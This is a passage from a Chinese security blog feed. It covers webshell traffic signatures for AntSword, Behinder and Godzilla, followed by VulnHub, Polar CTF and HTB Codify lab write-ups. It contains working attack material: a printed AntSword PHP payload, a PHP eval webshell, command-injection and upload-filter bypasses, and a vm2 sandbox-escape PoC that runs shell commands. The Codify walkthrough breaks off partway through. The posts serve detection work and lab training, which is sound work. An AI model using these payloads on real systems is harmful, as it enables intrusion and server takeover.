&quot;d0fa&quot;.&quot;402e&quot;;echo @asenc($outpu</span><br><span class="line">t);echo &quot;8ae&quot;.&quot;52a&quot;;&#125;ob_start();try&#123;$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if($</span><br><span class="line">D==&quot;&quot;)$D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);$R=&quot;&#123;$D&#125;&quot;;if(substr($D,0,1)!=&quot;/&quot;)</span><br><span class="line">&#123;foreach(range(&quot;C&quot;,&quot;Z&quot;)as $L)if(is_dir(&quot;&#123;$L&#125;:&quot;))$R.=&quot;&#123;$L&#125;:&quot;;&#125;else&#123;$R.=&quot;/&quot;;&#125;$R.=&quot;</span><br><span class="line">&quot;;$u=(function_exists(&quot;posix_getegid&quot;))?@posix_getpwuid(@posix_geteuid()):&quot;&quot;;$s</span><br><span class="line">=($u)?$u[&quot;name&quot;]:@get_current_user();$R.=php_uname();$R.=&quot;&#123;$s&#125;&quot;;echo $R;;&#125;catch</span><br><span class="line">(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die();</span><br></pre></td></tr></table></figure><ul><li>存在<code>@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);</code>开头</li><li>中间存在<code>echo &quot;d0fa&quot;.&quot;402e&quot;</code>、<code>echo &quot;8ae&quot;.&quot;52a&quot;</code>类此的拼接的随机数</li></ul><p>响应体：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d0fa402eD:/phpstudy_pro/WWW/pikachu/vul/unsafeupload/uploadsC:D:E:G:Windows NT LAPTOP-71B88B96 10.0 build 19045 (Windows 10) AMD64TsingZhi8ae52a</span><br></pre></td></tr></table></figure><ul><li>响应体格式为<code>随机数 结果 随机数</code>，其中两个随机数源于请求体中拼接随机数</li><li>结果有时候会采用base64编码，解码可以发现其攻击行为</li></ul><h2 id="冰蝎流量特征">冰蝎流量特征</h2><h3 id="冰蝎2">冰蝎2</h3><p><img src="https://image.icewindy.cn/2024/03/f5f85eee1f216b0c5ef3b488ed979326.png" alt="image-20240319160352803"></p><ul><li><p>使用AES-16+Base64加密；</p></li><li><p>需要两次GET访问获取密钥；</p></li><li><p>GET访问中默认webshell的密码为pass，参数值为3位随机数字；</p></li><li><p>密钥是直接接以16位字符的形式返回到客户端；</p></li><li><p>冰蝎的流量中，无论是GET还是POST都会存在content-type，在正常情况下只有POST形式的访问才会有</p><p><img src="https://image.icewindy.cn/2024/03/79a4c37f055c1e5026a85002f161e937.png" alt="image-20240319161022472"></p></li><li><p>内置了10多个User-Agent头，通过逆向可以得到内置的UA头，也为特征的一种。在每次建立新连接的时候，都会更换一个UA头，且不少UA头浏览器版本较老；</p></li><li><p>accept里有个q=.2（强特征）</p></li></ul><h3 id="冰蝎3">冰蝎3</h3><ul><li>使用AES-16+Base64加密的方式，取消了动态获取密钥的方式，使用固定密钥。AES使用的密钥为Webshell连接密码MD5的前面16位，默认为<code>rebeyond</code>即密钥为<code>e45e329feb5d925b</code>；</li><li>且一般在第二次会返回一个长度比较大的响应包，对应内容为phpinfo页面；</li><li>内置了10多个User-Agent头，通过逆向可以得到内置的UA头，也为特征的一种。在每次建立新连接的时候，都会更换一个UA头；</li><li>连接jsp的webshell的请求数据包中的content-type字段常见为application/octet-stream。</li></ul><h3 id="冰蝎4">冰蝎4</h3><ul><li>与前面版本类似，内置了10多个User-Agent头，预估是大概2分钟会更换一次UA;</li><li>referer为正常请求的webshell的页面链接，随机替换一个或几个部分;</li><li>与网上描述不同的是，现在Connection不再是<code>keep-alive</code>，而是<code>close</code>;</li><li>Content-Type字段（弱特征）通常是<code>Content-type: Application/x-www-form-urlencoded</code>；</li><li>Accept字段（弱特征）通常是<code>Accept: application/json, text/javascript, */*; q=0.01</code>；</li><li>在没有使用自定义传输的情况下，使用的是跟3一样的方式，默认为<code>rebeyond</code>即密钥为<code>e45e329feb5d925b</code>。</li><li>密文的长度为16的整数倍。</li></ul><h2 id="哥斯拉">哥斯拉</h2><p><img src="https://image.icewindy.cn/2024/03/d54860e4f48f44d1ef0cc71fcea21081.png" alt="image-20240319201455418"></p><ul><li>哥斯拉最明显的特征是cookie后面带了<code>;</code>，即使后续没有任何其他内容</li><li>响应体有一定特征：哥斯拉会把一个32位的md5字符串按照一半拆分，分别放在base64编码的数据的前后两部分。整个响应包的结构体征为：md5前十六位+base64+md5后十六位。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 蓝队 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>smb利用-vulnhub靶机WestWild v1.1</title>
      <link href="/2023/12/10/smb%E5%88%A9%E7%94%A8-vulnhub%E9%9D%B6%E6%9C%BAWestWild-v1-1/"/>
      <url>/2023/12/10/smb%E5%88%A9%E7%94%A8-vulnhub%E9%9D%B6%E6%9C%BAWestWild-v1-1/</url>
      
        <content type="html"><![CDATA[<p>下载地址：<a href="https://www.vulnhub.com/entry/westwild-11,338/">https://www.vulnhub.com/entry/westwild-11,338/</a></p><p><img src="https://image.icewindy.cn/2023/12/4e52f131eec0b3214bc1df68f8dab356.png" alt="image-20231212191455232"></p><p>用netdiscover扫描本网段的存活主机</p><p><img src="https://image.icewindy.cn/2023/12/833df19c0cd16504cdbb8db37178828a.png" alt="image-20231212192040192"></p><p>确定机子为VMware的主机，ip为192.168.31.89</p><h2 id="端口扫描">端口扫描</h2><h3 id="tcp端口扫描">tcp端口扫描</h3><p><img src="https://image.icewindy.cn/2023/12/6f35f2276cae7f329f154e54ad4a8fcc.png" alt="image-20231212192309263"></p><h3 id="详细信息扫描">详细信息扫描</h3><p><img src="https://image.icewindy.cn/2023/12/5dd317c29a47a0f2209b526855c517d7.png" alt="image-20231212192427356"></p><h2 id="访问网页">访问网页</h2><p><img src="https://image.icewindy.cn/2023/12/db898f396af3e90e42f17b4e18b444c6.png" alt="image-20231212192633329"></p><p>没什么信息，源码里也什么都没有。</p><h3 id="目录爆破">目录爆破</h3><p>既然没东西，那还是目录爆破一下，看看有什么可用目录</p><p><img src="https://image.icewindy.cn/2023/12/a402b2a3cfe813356e322b7670a9be93.png" alt="image-20231212192926439"></p><p><img src="https://image.icewindy.cn/2023/12/cb9685659f4b718cb456a58c5b587007.png" alt="image-20231212192955439"></p><p><img src="https://image.icewindy.cn/2023/12/8921aa3dfb19f1004f58747736e039f5.png" alt="image-20231212193006751"></p><p>一个没有权限，一个是网站主页，没有价值。</p><h2 id="smb共享-445端口">smb共享（445端口）</h2><p>在详细信息扫描那里，我们看到了靶机开启了SMB服务，也就是存在共享文件</p><p>我们用enum4linux枚举一下用户和共享文件夹</p><p><img src="https://image.icewindy.cn/2023/12/511a467206c153688259a3d65b2024e8.png" alt="image-20231212193317229"></p><p><img src="https://image.icewindy.cn/2023/12/73e7cebb3a4c2c42dc8c140bd75e5ee0.png" alt="image-20231212193343126"></p><p>可能为空密码，且存在一个wave的文件夹，直接用smbclient访问</p><p><img src="https://image.icewindy.cn/2023/12/213abfe16264cc8e0722616a8d236cda.png" alt="image-20231212193641827"></p><p>还真没密码啊？</p><p><img src="https://image.icewindy.cn/2023/12/130273a117f73b9857e2a5dc56bc2f61.png" alt="image-20231212193717776"></p><p>应该是什么编码，解码一下</p><p><img src="https://image.icewindy.cn/2023/12/9351567718bfce1fad1ec89b5d850c27.png" alt="image-20231212193746613"></p><p>base64解码得到用户名密码和flag1</p><h2 id="提权">提权</h2><p>用上面得到的用户名密码通过ssh连接</p><p><img src="https://image.icewindy.cn/2023/12/de3a7b4beb26b85a660135f19088bf35.png" alt="image-20231212194040369"></p><p>这个用户看起来并没有提权到root的权限，我们来看看这个用户有什么有写权限的文件</p><p>使用下面这个命令我们可以查到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm 0777 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/2023/12/17d64e86c8fc0cb9f5f61f916c676412.png" alt="image-20231212194146845"></p><p>直接执行一下这个.sh文件看看</p><p><img src="https://image.icewindy.cn/2023/12/7e0239e8bef446b7294ef38d3f76f173.png" alt="image-20231212194223399"></p><p>另外一个用户名密码，我们用ssh登录</p><p><img src="https://image.icewindy.cn/2023/12/c19ad68869e71bc3a279bd6a661e29a3.png" alt="image-20231212194314454"></p><p>拿到root权限</p><p><img src="https://image.icewindy.cn/2023/12/4dcc4a17147ac27027e61d1d78878635.png" alt="image-20231212194351316"></p><p>并且回到root目录下，拿到flag2。完成此靶机渗透</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>polar靶场2023冬季个人挑战赛writeup-web</title>
      <link href="/2023/12/09/polar%E9%9D%B6%E5%9C%BA2023%E5%86%AC%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwriteup-web/"/>
      <url>/2023/12/09/polar%E9%9D%B6%E5%9C%BA2023%E5%86%AC%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwriteup-web/</url>
      
        <content type="html"><![CDATA[<h1 id="简单">简单</h1><h2 id="cool">cool</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>不能用尝试执行system，我们来试试用passthru()执行一下ls</p><p><img src="https://image.icewindy.cn/2023/12/8b35aa6fe4ca20bcaf3695ebac72be90.png" alt=""></p><p>很好，进展很顺利，由于过滤了flag，我们直接用cat *来试试</p><p><img src="https://image.icewindy.cn/2023/12/9fff76a9311453c6cbc188922a7b7571.png" alt="image-20231209160610183"></p><p>ok，成功取得flag。</p><h2 id="upload">upload</h2><p><img src="https://image.icewindy.cn/2023/12/5fdb0ae85b8ab0544aea4b75deb20dd1.png" alt="image-20231209175852951"></p><p>打开源代码。发现有个注释，很像某种传值</p><p><img src="https://image.icewindy.cn/2023/12/fa101a4740f8f430cf33848d9b82fb02.png" alt="image-20231209175930653"></p><p>试试加上去，发现出现了代码</p><p><img src="https://image.icewindy.cn/2023/12/44984652817088af709b4ba81cbaf502.png" alt="image-20231209183712700"></p><p>审计一下php代码，发现是通过字符串匹配，然后将其替换为空来过滤掉相关后缀的文件。</p><p>先来试试上个图片马，发现似乎不会执行图片内的代码，看来只能上传php文件了。</p><p><img src="https://image.icewindy.cn/2023/12/7b9ed9b2f9ea4f6926377bd8baf8f1d9.png" alt="image-20231209184101857"></p><p>在代码审计中发现，他只会替换一次php，那我们上传一个<code>.pphphp</code>让他在替换后变成<code>.php</code>不就可以了吗？直接试试</p><p><img src="https://image.icewindy.cn/2023/12/fd631c6e64304cd39f81df8b019abf3a.png" alt="image-20231209184243274"></p><p>似乎成功了，直接启动蚁剑拿取flag</p><p><img src="https://image.icewindy.cn/2023/12/c2335dffdecc8b47debb1224c61c45a8.png" alt="image-20231209184330277"></p><h2 id="cookie欺骗">cookie欺骗</h2><p>先打开一遍，然后刷新用burpsuite劫持发现cookie里面有个参数user</p><p><img src="https://image.icewindy.cn/2023/12/d00d50d9e0b76adbde42f683e888ebe1.png" alt="image-20231209193529372"></p><p>直接修改为admin，然后放行拿取flag</p><p><img src="https://image.icewindy.cn/2023/12/04c70f8dde2916dbf127bd6f28da1252.png" alt="image-20231209193559105"></p><h2 id="干正则">干正则</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&quot;www.baidu.com&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    @<span class="title function_ invoke__">parse_str</span>(<span class="variable">$id</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span>[<span class="number">0</span>] == <span class="string">&#x27;www.polarctf.com&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag\.php/&#x27;</span>, <span class="variable">$ip</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;don&#x27;t show flag!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span> .= <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;ping -c 2 &#x27;</span> . <span class="variable">$a</span>[<span class="number">0</span>] . <span class="variable">$ip</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$result&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;其实很简单！&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过代码审计，我们发现我们需要完成两个任务</p><ol><li>把$a[0]修改为<code>www.polarctf.com</code></li><li>绕过<code>preg_match('/flag\.php/', $ip)</code>检查</li></ol><p>我们将id构造为<code>id=a[0]=www.polarctf.com</code>，这样我们<code>a[0]=www.polarctf.com</code>通过@parse_str把原来的$a替换成了<code>www.polarctf.com</code>，完成了第一个任务。</p><p><img src="https://image.icewindy.cn/2023/12/bd7fe86462e03d9c7ef47131fc9a5e75.png" alt="image-20231209202456378"></p><p>接下来我们需要构造命令，首先使用<code>;</code>结束掉Ping命令，然后再来考虑绕过，我第一时间想到的是<code>cat *</code>，然后不行</p><p><img src="https://image.icewindy.cn/2023/12/e4cee474ec51fd1f7d8b1cd46bfaf766.png" alt="image-20231209202533294"></p><p>我们再来试试tac，倒置版的cat，成功拿取flag</p><p><img src="https://image.icewindy.cn/2023/12/34438721b1e22077598b89fa04d1a066.png" alt="image-20231209202607260"></p><p>下面有个常见的cat的替代方案</p><p><img src="https://image.icewindy.cn/2023/12/f2f79091d62b2b0b876a3aa928658eda.png" alt="03483aca1d0af67cac014834e8b7bb2"></p><p>还可以用sort来排序且展示所有文件的内容</p><h1 id="中等">中等</h1><h2 id="phpurl">phpurl</h2><p><img src="https://image.icewindy.cn/2023/12/22902067bba248cdfc4f73e43211fa78.png" alt="image-20231209155540568"></p><p><img src="https://image.icewindy.cn/2023/12/247cb02b7de5b9193832406d1e94528f.png" alt="image-20231209155548888"></p><p>靶机给出的两个文件，首先我们来看这个文件名，直接用base64decode解码得到如下</p><p><img src="https://image.icewindy.cn/2023/12/c545ac85c40d2f4243f1e512fca9e61e.png" alt="image-20231209155648382"></p><p>打开这个页面我们得到php代码页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;xxs&quot;</span>===<span class="variable">$_GET</span>[sys]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;Not a good idea!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[sys] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[sys]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[sys] == <span class="string">&quot;xxs&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to polar LABS!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Flag: XXXXXXX &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">what can you find？</span><br></pre></td></tr></table></figure><p>简单分析得到，我们要传入一个url encode后的xxs</p><p>这里有一个陷阱，直接在本页面传入sys值什么反应都没有，这是因为这只是代码页面，我们要回到初始页面进行传值</p><p><img src="https://image.icewindy.cn/2023/12/2c53008a87abe6130a2c0b3371da9dbe.png" alt="image-20231209155940379"></p><p>出现了这样的问题，很明显我们没有传递到url encode值进去，在服务器那端接受到的是普通的&quot;xxs&quot;，我们进行二次encode再传递即可成功获取到flag</p><p><img src="https://image.icewindy.cn/2023/12/bd8658b6a2aa57d27076d86f23cda852.png" alt="image-20231209160107474"></p><h2 id="ezphp">ezphp</h2><p><img src="https://image.icewindy.cn/2023/12/febaa479cfc5f37312e822763c38e20a.png" alt="image-20231209161021746"></p><p>页面没有隐藏信息，既然爬虫，那我就直接上目录爆破了</p><p><img src="https://image.icewindy.cn/2023/12/81a950a31614c31df875939367c98fd3.png" alt="image-20231209163435934"></p><p>都访问一遍，发现两个比较重要的目录：/file/和/uploads/</p><p><img src="https://image.icewindy.cn/2023/12/8646094263edcb0568e68f5c599485a5.png" alt="image-20231209164852415"></p><p>两个php都访问一下</p><p>file.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">PolarD&amp;N CTF</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;file.php&#x27;</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">@<span class="keyword">include</span> <span class="variable">$filename</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很明显是个文件包含，或许我们可以通过隔壁的upload上传一些东西来包含一下？</p><p><img src="https://image.icewindy.cn/2023/12/b65de3bb2c87c0c77f8f659014d6fe9a.png" alt="image-20231209165000262"></p><p><img src="https://image.icewindy.cn/2023/12/2becf49e1371b626c4ec52b78a1e8831.png" alt="image-20231209165006786"></p><p>上传文件限定了jpg之类的，很明显，我们需要做个图片马</p><p>用copy命令在cmd下制作一下phpinfo()的图片，看看有没有诈</p><p><img src="https://image.icewindy.cn/2023/12/01e3d0abf46984305cd6f4889e9a8005.png" alt="image-20231209165251191"></p><p><img src="https://image.icewindy.cn/2023/12/c9562edf226cf25a6703beab386b9f08.png" alt="image-20231209165302313"></p><p>文件在/uploads/images下</p><p><img src="https://image.icewindy.cn/2023/12/8ff6dcf7b11e4d1bee732c02efca4029.png" alt="image-20231209165415999"></p><p>上传成功，我们再来构造一下url</p><p><img src="https://image.icewindy.cn/2023/12/ab9e2ae21fb2182e442f4f0b195d7ff2.png" alt="image-20231209165502960"></p><p>居然没有诈，直接构造图片马</p><p><img src="https://image.icewindy.cn/2023/12/edeb1819334184355d39215d34c92c92.png" alt="image-20231209165556798"></p><p>蚁剑启动！</p><p><img src="https://image.icewindy.cn/2023/12/7b134d9b7b7b7ad99e0f94238c87d44c.png" alt="image-20231209165701381"></p><p>在用户目录下找到了flag</p><p><img src="https://image.icewindy.cn/2023/12/18f51a3ef138d7f35380248026cf36ee.png" alt="image-20231209165729898"></p><h2 id="你的马呢？">你的马呢？</h2><p><img src="https://image.icewindy.cn/2023/12/c5d12eba65b4b9a7171236bf6380a307.png" alt="image-20231209192416803"></p><p>那我非得试试（）</p><p><img src="https://image.icewindy.cn/2023/12/946fc9518a3c055b545d3cc8e6222ffa.png" alt="image-20231209184649809"></p><p>那就跟着他试试</p><p><img src="https://image.icewindy.cn/2023/12/b2bb4d168c784fa2dfb9e2820679fea3.png" alt="image-20231209185045140"></p><p><img src="https://image.icewindy.cn/2023/12/5cf6bfe1d29fcacb0a3cb49b5982c3dc.png" alt="image-20231209184938176"></p><p>分别提交了一个有php和一个没带php的，看来会检测文件内容，检测方式就是是否有<code>php</code>。那我修改一个php标签</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hacker&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/2023/12/002ec85bde3c053e951a51944ecd794b.jpg" alt=""></p><p>显示上传成功，但是服务器没有执行脚本，直接把内容打了出来</p><p><img src="https://image.icewindy.cn/2023/12/67cf165ce24ca0e5501d94a00a23c76a.png" alt="image-20231209185441267"></p><p>我们发现打开靶机的时候，他有一个file的参数，那我们把我们这个jsp文件传进去试试</p><p>浏览器显示为空，很明显里面的php标签被执行了，直接用蚁剑连接</p><p><img src="https://image.icewindy.cn/2023/12/914076ff65733a355e9de67566471381.png" alt="image-20231209192704109"></p><p>测试成功，直接拿取flag</p><p><img src="https://image.icewindy.cn/2023/12/ad1f54bc27babadd9a1dbccc3d61a0ec.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB靶机-codify</title>
      <link href="/2023/11/12/HTB%E9%9D%B6%E6%9C%BA-codify/"/>
      <url>/2023/11/12/HTB%E9%9D%B6%E6%9C%BA-codify/</url>
      
        <content type="html"><![CDATA[<h2 id="连接并检查稳定性">连接并检查稳定性</h2><p><img src="https://image.icewindy.cn/2023/11/e649170f28c540a2dc2e2722f67992c0.png" alt="image-20231112150351605"></p><h2 id="信息收集">信息收集</h2><h3 id="tcp端口扫描">tcp端口扫描</h3><p><img src="https://image.icewindy.cn/2023/11/bf8728a12ba84aed4ed5cbba54fd3f96.png" alt="image-20231112150942281"></p><p>22 80 3000 8080开放，进行详细扫描</p><p><img src="https://image.icewindy.cn/2023/11/92a1f7b027f22837711c2c67d431674a.png" alt="image-20231112151036438"></p><h3 id="udp扫描">udp扫描</h3><p><img src="https://image.icewindy.cn/2023/11/00a1b3856ea03a8f70af4ddc83fde55e.png" alt="image-20231112151112032"></p><p>没有有用价值的内容</p><h2 id="web网页尝试">web网页尝试</h2><p>首先我们需要在hosts文件中添加一行记录</p><p><img src="https://image.icewindy.cn/2023/11/7202470825bfe94f4545007324e914ff.png" alt="image-20231112151738669"></p><p>访问查看网页</p><p><img src="https://image.icewindy.cn/2023/11/e519db8baed0c48a0e11b190b8d0b8c0.png" alt="image-20231112151837700"></p><p>发现是个nodejs代码沙盒测试环境。点开about us页面</p><p><img src="https://image.icewindy.cn/2023/11/b1802a9bd29f5afd8c84cfe9bd769e3e.png" alt="image-20231112151933539"></p><p>我们发现是基于vm2的库搭建的沙盒，并且超链接给出了我们vm2的版本信息</p><p><img src="https://image.icewindy.cn/2023/11/eb2203f84d9b402f2cc5bc5b312b13ff.png" alt="image-20231112195849580"></p><p>对于沙盒类的代码执行，我们很容易想到的是沙盒逃逸类的漏洞，我们可以去检索一下vm2相关的沙盒逃逸类的漏洞，以&quot;vm2 sandbox escape vulnerability&quot;类似的关键词在搜索引擎检索</p><p><img src="https://image.icewindy.cn/2023/11/ca7f0bc495d5383b5732578e0ef054be.png" alt="image-20231112202206562"></p><p>检索到一个漏洞，并且版本符合3.9.16。打开利用的poc<a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">Sandbox Escape in vm2@3.9.16 (github.com)</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;<span class="variable constant_">VM</span>&#125; = <span class="built_in">require</span>(<span class="string">&quot;vm2&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title function_">VM</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">err = &#123;&#125;;</span></span><br><span class="line"><span class="string">const handler = &#123;</span></span><br><span class="line"><span class="string">    getPrototypeOf(target) &#123;</span></span><br><span class="line"><span class="string">        (function stack() &#123;</span></span><br><span class="line"><span class="string">            new Error().stack;</span></span><br><span class="line"><span class="string">            stack();</span></span><br><span class="line"><span class="string">        &#125;)();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">const proxiedErr = new Proxy(err, handler);</span></span><br><span class="line"><span class="string">try &#123;</span></span><br><span class="line"><span class="string">    throw proxiedErr;</span></span><br><span class="line"><span class="string">&#125; catch (&#123;constructor: c&#125;) &#123;</span></span><br><span class="line"><span class="string">    c.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;touch pwned&#x27;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(vm.<span class="title function_">run</span>(code));</span><br></pre></td></tr></table></figure><h2 id="利用漏洞拿到反弹shell">利用漏洞拿到反弹shell</h2><p>我们找到这个漏洞后，先来尝试一下能否使用</p><p><img src="https://image.icewindy.cn/2023/11/7b227564cc706bce3a46f379ab90b846.png" alt="image-20231112202424869"></p><p>接下来我们要编写反弹shell利用，这里我尝试了直接利用bash -i，似乎没奏效，因此我们改变思路，利用curl web服务器内容后管道执行。首先要编写一个index.html文件，在里面编写成反弹shell的脚本</p><p><img src="https://image.icewindy.cn/2023/11/cb851d2b00857f237b3eb907ea2b15f1.png" 